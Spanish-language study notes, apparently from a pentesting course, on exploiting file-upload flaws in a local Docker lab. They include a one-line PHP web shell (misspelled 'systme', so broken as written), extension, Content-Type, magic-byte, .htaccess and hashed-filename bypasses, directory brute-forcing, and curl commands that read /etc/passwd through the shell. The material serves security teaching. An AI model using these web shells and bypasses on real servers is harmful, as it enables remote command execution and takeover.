# Abuso de subidas de archivos

Tags: #AbusoSubidaArchivos #OWASP #Explotacion 

El abuso de subidas de archivos es un tipo de ataque que se produce cuando un atacante aprovecha las vulnerabilidades en las aplicaciones web que permiten a los usuarios **cargar archivos** en el servidor. Este tipo de ataque se conoce comúnmente como un ataque de “**subida de archivos maliciosos**“.

En un ataque de subida de archivos maliciosos, un atacante carga un archivo malicioso en una aplicación web, que luego se almacena en el servidor. Si por ejemplo el atacante consigue subir un archivo PHP y el servidor web lo almacena, podría conseguir ejecución remota de comandos y tomar el control del servidor.

Los atacantes también pueden utilizar técnicas de “**falsificación de tipos de archivos**” para engañar a una aplicación web con el objetivo de que acepte un archivo malicioso como si fuera un archivo legítimo.

En esta clase, exploraremos algunas de las técnicas más utilizadas para explotar la fase de subida de archivos en aplicaciones web. Aprenderás cómo los atacantes pueden cargar contenido malicioso, además de eludir diferentes restricciones implementadas para lograrlo.

A continuación, se os comparte el enlace al proyecto de Github el cual estaremos empleando para desplegar un laboratorio práctico en Docker con el que poder practicar estos conceptos:

-   **File Upload Laboratory**: [https://github.com/moeinfatehi/file_upload_vulnerability_scenarios](https://github.com/moeinfatehi/file_upload_vulnerability_scenarios)


## Escenarios 

1. Podemos subir un archivo  sin importar que no sea la extensión mencionada ya que la web no esta sanitizada en ninguna parte. 
* Podemos crear nuestros scripts en **cmd.php**, cabe mencionar que la web debe tener como 'Programming Languages = PHP'
```php 
<?php
	systme($_GET['cmd']);          # Controlar el comando que querramos meter, en la web debemos de colocar "?cmd=Command"
?>
```


3. Podemos subir un archivo, la web esta sanitizada ya que esta aplicando una validación a la extensión del archivo.
* Debemos de ver en  donde se esta aplicando la validación, si es en el 'Servidor o Cliente en nuestro navegador'

![](Pasted%20image%2020230509161842.png)

![](Pasted%20image%2020230509161627.png)

Cuando la validación es en **nuestro navegador web**. Podemos eliminar toda esa parte de 'onsubmit' y esto hará que ya no exista la validación. Eso se encuentra en el inspector en la parte de 'Upload'


10. Nos dice que subir archivos PHP están prohibidos 
* Nos damos cuenta que la validación la hace el **servidor**, ya que miramos que al momento de subir el archivo php nos hace un 'Redirect'
* [HackTricks-PHP](https://book.hacktricks.xyz/pentesting-web/file-upload) En esta web podemos ver algunas alternativas a la extensión PHP

![](Pasted%20image%2020230509162940.png)

Debemos ir cambiando de extensión hasta que alguna funcione en el servidor e interprete el código, para este caso seria ".php5".


11. Nos dice que subir archivos PHP están prohibidos y algunas de sus extensiones como 'php3, php4...' no nos deja o no nos lo interpreta. 
Para esta ocasión debemos de subir otro tipo de extensiones como 'pht, phtm...' y ver que nos lo interprete la web.

![](Pasted%20image%2020230509164104.png)


12. Nos dice que subir archivos PHP están prohibidos 
* No nos dejara subir archivos .php3, .php4 ... ni algunas extensiones como lo son .pht, .phtm, .phtml...

Debemos de aplicar una política para poder decir que cuando subamos un archivo, este pueda ser interpretado por PHP. Y o haremos con '.htaccess'
**.htaccess**: Conocido como archivo de configuración distribuida, es un fichero especial, popularizado por el servido HTTP Apache que permite definir diferentes directivas de configuración para cada directorio sin necesidad de editar el archivo de configuración principal de Apache. 

* [Bypass-Filter-Upload](https://thibaud-robin.fr/articles/bypass-filter-upload/)

![](Pasted%20image%2020230509165455.png)

En lugar de subir un archivo con alguna de las extensiones. Podemos hacer lo siguiente:

![](Pasted%20image%2020230509165622.png)

En donde agregamos el '.htaccess', además de cambiarle el 'Content-Type' y al final le diremos que los archivos que sean .test nos lo interprete como PHP.

![](Pasted%20image%2020230509165836.png)

Adicional tenemos que subir un archivo, pero con la terminación '.test' por lo que será interpretado y podremos ejecutar comandos.


16. Nos restringe por el tamaño del archivo.  
- Primer forma de hacerlo es:
Podemos ver el tamaño máximo del archivo a subir que en este caso es 30, pero lo podemos modificar a un tamaño que nos deje subir como por ejemplo 80.

![](Pasted%20image%2020230510132746.png)

* Segunda forma de hacerlo:
Podemos ir modificando el contenido hasta que nos de un tamaño aceptable por el servidor.

![](Pasted%20image%2020230510133319.png)

En la web pondriamos **?0=Command** 


17. Nos restringe por el tamaño del archivo con una seguridad extra.
Podemos representar el mismo contenido de php pero de esta manera, para reducir aun mas el espacio. 

![](Pasted%20image%2020230510133737.png)

En la web pondriamos **?0=Command** 


21. Tenemos una restricción en el tipo de archivo. 
* Lo que validan en esta ocasión es el '**Content-Type**', para un archivo php sale el siguiente.

![](Pasted%20image%2020230510134340.png)

En esta ocasión podemos manipularlo y colocarle uno como si fuera de una imagen. **'image/jpg'**

![](Pasted%20image%2020230510134517.png)


23. Tenemos una restricción en el tipo de archivo. Solo podemos subir archivos gif
La validación se hace con los 'Magic Numbers' que son los primeros números. Por lo que podríamos colocarle al principio **GIF8;** y con eso podríamos subir el archivo. 

![](Pasted%20image%2020230510135308.png)


31. Podemos subir solo archivos 'jpeg, gif'
En esta ocasión si nos deja subir el archivo .php pero nos coloca un gif que al momento de mirar su 'nombre' en BurpSuite observamos que tiene 32 caracteres y esto nos da a entender que lo que subamos le aplican MD5 y después le ponen la extensión. 

Podemos aplicarle MD5 al nombre de nuestro archivo. 
```bash
❯ echo -n "cmd" | md5sum              # Para aplicar md5 a un nombre

	# n = Quitar el salto de linea y asi no cambie el MD5
```

![](Pasted%20image%2020230510140501.png)

Ahora en la url de la web colocamos el md5 y la extensión .php = **dfff0a7fa1a55c8c1a4966c19f6da452.php** y después le colocamos **?cmd=Command** 


33. Solo podemos subir solo archivos 'jpeg, gif'
Para este reto nos deja subir el archivo y también esta aplicando un MD5 pero lo hace también a la extensión.

Podemos aplicarle MD5 al nombre de nuestro archivo. 
```bash
❯ echo -n "cmd.php" | md5sum              # Para aplicar md5 a un nombre y su extension 

	# n = Quitar el salto de linea y asi no cambie el MD5
```

Ahora en la url de la web colocamos el md5 y la extensión .php = **b0e4bdfca013a84e5f0b9bc9ae028945.php** y después le colocamos **?cmd=Command** 


35. Solo podemos subir solo archivos 'jpeg, gif'
Para este reto le están aplicando el **sha1sum** al contenido del archivo ya que tiene 40 caracteres el gif que nos sale por defecto.
```bash
❯ echo -n "cmd" | sha1sum                 # Para aplicar sha1sum a un nombre
❯ echo -n "cmd.php" | sha1sum             # Para aplicar sha1sum a un nombre y la extension
❯ sha1sum cmd.php                         # Para aplicar sha1sum al contenido de un archivo 
```

Ahora en la url de la web colocamos el md5 y la extensión .php = **17717d2bf6c721c49d517e7edad96d0750a17a4b.php** y después le colocamos **?cmd=Command** 


41. Solo podemos subir solo archivos 'jpeg, gif'
Para este caso debemos de hacer un ataque de Fuerza Bruta y encontrar el directorio en donde se esta almacenando el archivo.
```bash
❯ gobuster dir -u http://localhost:9001/upload41/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
Nos encuentra dos directorios '**images, static**'

Probamos agregando alguno de esos directorios y le colocamos en la web "?cmd=Command"


51. Solo podemos subir solo archivos 'jpeg'
Para esta ocasión haremos un ataque de doble extensión y colocarle al archivo .jpg

![](Pasted%20image%2020230510150307.png)


56. Nos pide que coloquemos un nombre de dir 'testing' y subamos un archivo. 
Al momento de darnos el enlace, lo que hace el servidor es tratar de descargarnos el archivo. Por lo que podemos copiarnos esa url y hacer el ataque por consola.
```bash
❯ curl -s -X GET "http://localhost:9001/upload56/testing/cmd.php"   # Miramos el contenido de la web 
```

```bash
❯ curl -s -X GET "http://localhost:9001/upload56/testing/cmd.php" -G --data-urlencode "cmd=id"    # Haremos que nos urlencodee una data que queremos concatenarle
❯ curl -s -X GET "http://localhost:9001/upload56/testing/cmd.php" -G --data-urlencode "cmd=cat /etc/passwd"

	# G = No tenemos que url-encodear espacios
```


58. Nos pide que coloquemos un nombre de dir 'pwned' y subamos un archivo. Pero no podemos subir archivos ejecutables. 

Debemos de subir el archivo .htaccess y el contenido correspondiente.
![](Pasted%20image%2020230510151639.png)

Después debemos de cambiarle esos tres parámetros para que nos lo deje subir.

![](Pasted%20image%2020230510151826.png)


Podemos usar los metadatos para inyectar código php con la herramienta **exiftool** a una imagen y cuando apuntemos a la imagen en algún punto nos colocara en este caso el resultado del comando 'whoami'

![](Pasted%20image%2020230510152313.png)